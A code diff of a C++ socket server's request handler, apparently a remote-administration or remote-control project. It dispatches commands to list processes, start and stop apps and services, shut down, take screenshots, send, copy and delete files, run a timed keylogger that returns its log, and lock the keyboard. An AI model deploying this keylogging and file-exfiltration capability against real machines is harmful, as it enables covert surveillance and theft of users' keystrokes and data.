+            sendFile(clientSocket, "ServiceList.txt");
             sendJSON(clientSocket, jsonResponse);
-
         }
-        else if (j.at("title") == "startApp") {
-            if (j.contains("nameObject")) {
-                jsonResponse = startApp(j.at("nameObject"));
+        else if (Request.at("title") == "listProcess") {
+            jsonResponse = listServices();
+            sendFile(clientSocket, "ProcessList.txt");
+            sendJSON(clientSocket, jsonResponse);
+        }
+        else if (Request.at("title") == "startApp") {
+            if (Request.contains("nameObject")) {
+                jsonResponse = startApp(Request.at("nameObject"));
                 sendJSON(clientSocket, jsonResponse);
             }
         }
-        else if (j.at("title") == "startService") {
-            if (j.contains("nameObject")) {
-                jsonResponse = startService(j.at("nameObject"));
+        else if (Request.at("title") == "startService") {
+            if (Request.contains("nameObject")) {
+                jsonResponse = startService(Request.at("nameObject"));
                 sendJSON(clientSocket, jsonResponse);
             }
         }
-        else if (j.at("title") == "stopApp") {
-            if (j.contains("nameObject")) {
-                jsonResponse = stopApp(j.at("nameObject"));
+        else if (Request.at("title") == "stopApp") {
+            if (Request.contains("nameObject")) {
+                jsonResponse = stopApp(Request.at("nameObject"));
                 sendJSON(clientSocket, jsonResponse);
             }
         }
-        else if (j.at("title") == "stopService") {
-            if (j.contains("nameObject")) {
-                jsonResponse = stopService(j.at("nameObject"));
+        else if (Request.at("title") == "stopService") {
+            if (Request.contains("nameObject")) {
+                jsonResponse = stopService(Request.at("nameObject"));
                 sendJSON(clientSocket, jsonResponse);
             }
         }
-        else if (j.at("title") == "restart") {
+        else if (Request.at("title") == "restart") {
             json jsonResponse_temp;
             jsonResponse_temp["title"] = "restart";
             jsonResponse_temp["result"] = "Your computer will be restart in few seconds";
@@ -1383,49 +1422,61 @@ void processRequest(SOCKET& clientSocket, string jsonRequest) {
             sendJSON(clientSocket, jsonResponse_temp.dump());
             restart();
         }
-        else if (j.at("title") == "shutdown") {
+        else if (Request.at("title") == "shutdown") {
             json jsonResponse_temp;
             jsonResponse_temp["title"] = "restart";
             jsonResponse_temp["result"] = "Your computer has been successfully shutdown";
 
             sendJSON(clientSocket, jsonResponse);
         }
-        else if (j.at("title") == "startWebcam") {
+        else if (Request.at("title") == "startWebcam") {
             int duration = 10;
-            jsonResponse = startWebcam(clientSocket, duration);
+            //jsonResponse = startWebcam(clientSocket, duration);
             sendJSON(clientSocket, jsonResponse);
         }
 
-        else if (j.at("title") == "stopWebcam") {
-            jsonResponse = stopWebcam();
+        else if (Request.at("title") == "stopWebcam") {
+            //jsonResponse = stopWebcam();
             sendJSON(clientSocket, jsonResponse);
         }
 
-        else if (j.at("title") == "screenShot") {
+        else if (Request.at("title") == "screenShot") {
             string filePath = screenShot();
-            json j;
-
-            j["title"] = "screenShot";
-
-            if (sendFile(clientSocket, filePath)) {
-                j["result"] = "Successfully screenshot";
-            }
-            else {
-                j["result"] = "Failed to screenshot";
-            }
-
-            jsonResponse = j.dump();
-            sendJSON(clientSocket, jsonResponse);
-        }
-
-        else if (j.at("title") == "sendFile") {
             json temp;
 
-            string fileName = j.at("nameObject");
+            temp["title"] = "screenShot";
 
-            j["title"] = "sendFile";
+            if (sendFile(clientSocket, filePath)) {
+                temp["result"] = "Successfully screenshot";
+            }
+            else {
+                temp["result"] = "Failed to screenshot";
+            }
 
-            if (sendFile(clientSocket, fileName)) {
+            jsonResponse = temp.dump();
+            sendJSON(clientSocket, jsonResponse);
+        }
+
+        else if (Request.at("title") == "sendFile") {
+            json temp;
+
+            string filePath = Request.at("nameObject");
+
+            // get file name to send client
+            size_t pos = filePath.rfind('\\');
+
+            string fileName;
+            if (pos != string::npos) {
+                fileName = filePath.substr(pos + 1);
+            }
+            else {
+                fileName = filePath;
+            }
+
+            temp["title"] = "sendFile";
+            temp["fileName"] = fileName;
+
+            if (sendFile(clientSocket, filePath)) {
                 temp["result"] = "File copied and sent successfully";
             }
             else {
@@ -1436,28 +1487,28 @@ void processRequest(SOCKET& clientSocket, string jsonRequest) {
             sendJSON(clientSocket, jsonResponse);
         }
 
-        else if (j.at("title") == "copyFile") {
-            jsonResponse = copyFile(j.at("source"), j.at("destination"));
+        else if (Request.at("title") == "copyFile") {
+            jsonResponse = copyFile(Request.at("source"), Request.at("destination"));
             sendJSON(clientSocket, jsonResponse);
         }
 
-        else if (j.at("title") == "deleteFile") {
-            string filePath = j.at("nameObject");
+        else if (Request.at("title") == "deleteFile") {
+            string filePath = Request.at("nameObject");
 
             jsonResponse = deleteFile(filePath);
             sendJSON(clientSocket, jsonResponse);
         }
 
-        else if (j.at("title") == "keyLogger") {
-            string t = j.at("nameObject");
-            int duration = stoi(t);
+        else if (Request.at("title") == "keyLogger") {
+            string time = Request.at("nameObject");
+            int duration = stoi(time);
 
             jsonResponse = keyLogger(duration);
             sendFile(clientSocket, "keyLogger.txt");
             sendJSON(clientSocket, jsonResponse);
         }
 
-        else if (j.at("title") == "keyLocking") {
+        else if (Request.at("title") == "keyLocking") {
             bool flag = false;
             jsonResponse = solveKeyLockingAndSend(flag);
             sendJSON(clientSocket, jsonResponse);
@@ -1465,14 +1516,13 @@ void processRequest(SOCKET& clientSocket, string jsonRequest) {
             if (flag) runKeyLockingLoop();
         }
 
-        else if (j.at("title") == "keyUnlocking") {
-
+        else if (Request.at("title") == "keyUnlocking") {
             bool flag;
             jsonResponse = solveKeyUnlockingAndSend(flag);
             sendJSON(clientSocket, jsonResponse);
         }
 
-        else if (j.at("title") == "getDirectoryTree") {
+        else if (Request.at("title") == "getDirectoryTree") {
             jsonResponse = createDiractoryTree();
             sendFile(clientSocket, "DirectoryTree.txt");
             sendJSON(clientSocket, jsonResponse);
@@ -1486,7 +1536,6 @@ void processRequest(SOCKET& clientSocket, string jsonRequest) {
 
             jsonResponse = temp.dump();
             sendJSON(clientSocket, jsonResponse);
-
         }
     }
 }
